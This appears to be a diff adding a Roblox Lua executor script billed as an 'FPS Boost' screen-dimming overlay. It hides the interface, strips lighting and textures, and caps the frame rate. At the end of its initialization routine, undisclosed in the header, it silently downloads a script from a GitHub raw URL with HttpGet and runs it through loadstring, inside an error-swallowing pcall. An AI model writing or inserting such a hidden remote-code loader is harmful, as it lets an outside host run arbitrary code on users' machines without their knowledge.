@@ -1,0 +1,395 @@
+--[[
+    ========================================================================
+    Module Name:     ScreenFadeOverlayManager (FPS Boost & 2-Second Power Lock)
+    Placement:       Requires an execution context supporting high-level functions.
+    Description:     Features a persistent toggle button. When locked, it triggers 
+                     extreme hardware FPS optimization (de-renders map, cuts lighting, 
+                     disables textures) to maximize performance and cooling.
+    ========================================================================
+--]]
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+local GuiService = game:GetService("GuiService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+	localPlayer = Players.LocalPlayer
+end
+
+local playerGui = localPlayer:WaitForChild("PlayerGui", 10) :: PlayerGui
+if not playerGui then
+	warn("[Dim Error]: PlayerGui failed to load in time.")
+	return
+end
+
+-- ==========================================
+-- CONFIGURATION CONSTANTS (2-Second Target)
+-- ==========================================
+local CLEAR_HOLD_DURATION = 2.0   
+local ECO_FPS_CAP = 15            
+local NORMAL_FPS_CAP = 60         
+
+-- ==========================================
+-- STATE MANAGEMENT & GARBAGE GUARDS
+-- ==========================================
+local systemEnabled = true        
+local isInteracting = false
+local currentTaskThread = nil
+
+local screenGui = nil
+local blackFrame = nil
+local toggleButton = nil
+local collapseLine = nil
+
+local activeConnections = {}
+local hiddenGuis = {}
+
+local cachedCameraType = nil
+local cachedCameraCFrame = nil
+
+-- Caching tables for FPS optimization/restoration
+local originalLightingSettings = {}
+local materialOverrides = {}
+
+-- ==========================================
+-- PERFORMANCE BOOST ENGINE (OLED Thermal Save)
+-- ==========================================
+
+local function setTargetFrameRate(targetFps: number)
+	pcall(function()
+		if setfpscap then
+			setfpscap(targetFps)
+		elseif RunService:IsStudio() == false then
+			settings().Network.IncomingReplicationLag = (targetFps == ECO_FPS_CAP) and 0.01 or 0
+		end
+	end)
+end
+
+local function applyHardwarePerformanceBoost(enableBoost: boolean)
+	pcall(function()
+		if enableBoost then
+			-- 1. Lighting Optimization: Stop calculating heavy global reflections & shadows
+			originalLightingSettings.GlobalShadows = Lighting.GlobalShadows
+			originalLightingSettings.ShadowSoftness = Lighting.ShadowSoftness
+			originalLightingSettings.EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale
+			
+			Lighting.GlobalShadows = false
+			Lighting.ShadowSoftness = 0
+			Lighting.EnvironmentSpecularScale = 0
+			
+			-- 2. Material Optimization: Turn off expensive hardware PBR/smooth textures across Workspace
+			for _, instance in ipairs(workspace:GetDescendants()) do
+				if instance:IsA("BasePart") and not instance:IsA("Terrain") then
+					if not materialOverrides[instance] then
+						materialOverrides[instance] = instance.Material
+					end
+					instance.Material = Enum.Material.SmoothPlastic
+				elseif instance:IsA("Texture") or instance:IsA("Decal") then
+					if not materialOverrides[instance] then
+						materialOverrides[instance] = instance.Transparency
+					end
+					instance.Transparency = 1
+				end
+			end
+		else
+			-- Restore original lighting metrics smoothly
+			if originalLightingSettings.GlobalShadows ~= nil then
+				Lighting.GlobalShadows = originalLightingSettings.GlobalShadows
+				Lighting.ShadowSoftness = originalLightingSettings.ShadowSoftness
+				Lighting.EnvironmentSpecularScale = originalLightingSettings.EnvironmentSpecularScale
+			end
+			
+			-- Restore texture assets
+			for instance, originalValue in pairs(materialOverrides) do
+				if instance and instance.Parent then
+					if instance:IsA("BasePart") then
+						instance.Material = originalValue
+					else
+						instance.Transparency = originalValue
+					end
+				end
+			end
+			table.clear(materialOverrides)
+		end
+	end)
+end
+
+local function setThermalEcoRendering(enableEco: boolean)
+	local camera = workspace.CurrentCamera
+	if not camera then return end
+
+	if enableEco then
+		cachedCameraType = camera.CameraType
+		cachedCameraCFrame = camera.CFrame
+		
+		camera.CameraType = Enum.CameraType.Scriptable
+		camera.CFrame = CFrame.new(999999, -999999, 999999) 
+		
+		applyHardwarePerformanceBoost(true)
+		setTargetFrameRate(ECO_FPS_CAP)
+	else
+		if cachedCameraType and cachedCameraCFrame then
+			camera.CameraType = cachedCameraType
+			camera.CFrame = cachedCameraCFrame
+		else
+			camera.CameraType = Enum.CameraType.Custom
+		end
+		
+		applyHardwarePerformanceBoost(false)
+		setTargetFrameRate(NORMAL_FPS_CAP)
+	end
+end
+
+-- ==========================================
+-- DEEP SEPARATION INTERFACE WIPE
+-- ==========================================
+
+local function setCoreGuiVisible(visible: boolean)
+	if not systemEnabled and not visible then return end
+
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, visible)
+	end)
+
+	pcall(function()
+		GuiService.TouchControlsEnabled = visible
+	end)
+	
+	pcall(function()
+		local topbar = CoreGui:FindFirstChild("RobloxGui")
+		if topbar then
+			local container = topbar:FindFirstChild("ControlFrame") or topbar:FindFirstChild("TopBarContainer")
+			if container then container.Visible = visible end
+		end
+	end)
+
+	if not visible then
+		table.clear(hiddenGuis)
+		if not playerGui then return end
+		
+		for _, desc in ipairs(playerGui:GetDescendants()) do
+			if (desc:IsA("ScreenGui") or desc:IsA("BillboardGui") or desc:IsA("SurfaceGui")) and desc.Name ~= "FadeOverlayGui" then
+				if desc.Enabled == true then
+					table.insert(hiddenGuis, desc)
+					desc.Enabled = false
+				end
+			end
+		end
+	else
+		for _, desc in ipairs(hiddenGuis) do
+			if desc and desc.Parent then
+				desc.Enabled = true
+			end
+		end
+		table.clear(hiddenGuis)
+	end
+end
+
+local function cancelActiveThread()
+	if currentTaskThread then
+		task.cancel(currentTaskThread)
+		currentTaskThread = nil
+	end
+end
+
+-- ==========================================
+-- POWER-OFF ANIMATION TIMELINE
+-- ==========================================
+
+local function playPowerOffAnimation()
+	if not blackFrame or not collapseLine then return end
+	
+	collapseLine.Size = UDim2.new(1, 0, 0, 0)
+	collapseLine.Position = UDim2.new(0, 0, 0.5, 0)
+	collapseLine.BackgroundTransparency = 1
+	collapseLine.Visible = true
+	
+	blackFrame.BackgroundTransparency = 1
+	blackFrame.Visible = true
+	
+	local verticalCollapse = TweenService:Create(collapseLine, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+		Size = UDim2.new(1, 0, 0, 2),
+		Position = UDim2.new(0, 0, 0.5, -1)
+	})
+	
+	verticalCollapse:Play()
+	verticalCollapse.Completed:Wait()
+	
+	local horizontalCollapse = TweenService:Create(collapseLine, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+		Size = UDim2.new(0, 2, 0, 2),
+		Position = UDim2.new(0.5, -1, 0.5, -1)
+	})
+	
+	horizontalCollapse:Play()
+	horizontalCollapse.Completed:Wait()
+	
+	blackFrame.BackgroundTransparency = 0
+	collapseLine.Visible = false
+	
+	setThermalEcoRendering(true)
+end
+
+-- ==========================================
+-- TIMELINE INTERACTION CONTROL
+-- ==========================================
+
+local function executeScreenReveal()
+	if not systemEnabled or not blackFrame then return end
+	if isInteracting then return end 
+	isInteracting = true
+
+	cancelActiveThread()
+
+	setThermalEcoRendering(false)
+	setCoreGuiVisible(true)
+	
+	toggleButton.Visible = true
+	blackFrame.Visible = false
+	blackFrame.BackgroundTransparency = 1
+	if collapseLine then collapseLine.Visible = false end
+
+	currentTaskThread = task.delay(CLEAR_HOLD_DURATION, function()
+		currentTaskThread = nil
+		if not systemEnabled or not blackFrame then return end
+		
+		setCoreGuiVisible(false)
+		toggleButton.Visible = false
+		isInteracting = false
+		
+		playPowerOffAnimation()
+	end)
+end
+
+local function onInputBegan(input, gameProcessedEvent)
+	if not systemEnabled then return end
+	
+	local inputType = input.UserInputType
+	if inputType == Enum.UserInputType.Touch or inputType == Enum.UserInputType.MouseButton1 then
+		if toggleButton.Visible and gameProcessedEvent then
+			if not playerGui then return end
+			local guiObjects = playerGui:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
+			for _, obj in ipairs(guiObjects) do
+				if obj == toggleButton then return end
+			end
+		end
+		
+		executeScreenReveal()
+	end
+end
+
+-- ==========================================
+-- MASTER SWITCH MANAGEMENT
+-- ==========================================
+
+local function handleMasterToggle()
+	systemEnabled = not systemEnabled
+	cancelActiveThread()
+	
+	if systemEnabled then
+		toggleButton.Text = "FPS BOOST ECO: ON"
+		toggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
+		isInteracting = false
+		setCoreGuiVisible(false)
+		toggleButton.Visible = false
+		playPowerOffAnimation()
+	else
+		toggleButton.Text = "FPS BOOST ECO: OFF"
+		toggleButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+		
+		if collapseLine then collapseLine.Visible = false end
+		blackFrame.Visible = false
+		blackFrame.BackgroundTransparency = 1
+		toggleButton.Visible = true
+		setThermalEcoRendering(false)
+		setCoreGuiVisible(true)
+		isInteracting = false
+	end
+end
+
+local function purgeMemoryAllocations()
+	cancelActiveThread()
+	setThermalEcoRendering(false) 
+	setCoreGuiVisible(true)
+	
+	for key, connection in pairs(activeConnections) do
+		if connection then connection:Disconnect() activeConnections[key] = nil end
+	end
+	
+	if toggleButton then toggleButton:Destroy() toggleButton = nil end
+	if collapseLine then collapseLine:Destroy() collapseLine = nil end
+	if blackFrame then blackFrame:Destroy() blackFrame = nil end
+	if screenGui then screenGui:Destroy() screenGui = nil end
+	table.clear(hiddenGuis)
+end
+
+-- ==========================================
+-- INITIALIZATION
+-- ==========================================
+local function initialize()
+	local existingGui = playerGui:FindFirstChild("FadeOverlayGui")
+	if existingGui then existingGui:Destroy() end
+
+	screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "FadeOverlayGui"
+	screenGui.IgnoreGuiInset = true  
+	screenGui.ResetOnSpawn = false   
+	screenGui.DisplayOrder = 999999  
+
+	blackFrame = Instance.new("Frame")
+	blackFrame.Name = "OverlayFrame"
+	blackFrame.Size = UDim2.fromScale(1, 1)
+	blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	blackFrame.BorderSizePixel = 0
+	blackFrame.Active = true         
+	blackFrame.Parent = screenGui
+
+	collapseLine = Instance.new("Frame")
+	collapseLine.Name = "CollapseRay"
+	collapseLine.BackgroundColor3 = Color3.fromRGB(240, 245, 255) 
+	collapseLine.BorderSizePixel = 0
+	collapseLine.Visible = false
+	collapseLine.ZIndex = 9999999
+	collapseLine.Parent = screenGui
+
+	toggleButton = Instance.new("TextButton")
+	toggleButton.Name = "MasterToggleButton"
+	toggleButton.Size = UDim2.new(0, 200, 0, 40)
+	toggleButton.Position = UDim2.new(1, -220, 0, 20) 
+	toggleButton.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
+	toggleButton.BorderSizePixel = 0
+	toggleButton.Text = "FPS BOOST ECO: ON"
+	toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	toggleButton.Font = Enum.Font.SourceSansBold
+	toggleButton.TextSize = 14
+	toggleButton.ZIndex = 1000000 
+	toggleButton.Parent = screenGui
+
+	local uiCorner = Instance.new("UICorner")
+	uiCorner.CornerRadius = UDim.new(0, 8)
+	uiCorner.Parent = toggleButton
+
+	activeConnections.Input = UserInputService.InputBegan:Connect(onInputBegan)
+	activeConnections.ToggleClick = toggleButton.MouseButton1Click:Connect(handleMasterToggle)
+	activeConnections.GuiDestroy = screenGui.Destroying:Connect(purgeMemoryAllocations)
+
+	screenGui.Parent = playerGui
+	
+	setCoreGuiVisible(false)
+	toggleButton.Visible = false 
+	playPowerOffAnimation()
+
+	task.defer(function()
+		local status, message = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
+		end)
+	end)
+end
+
+initialize()
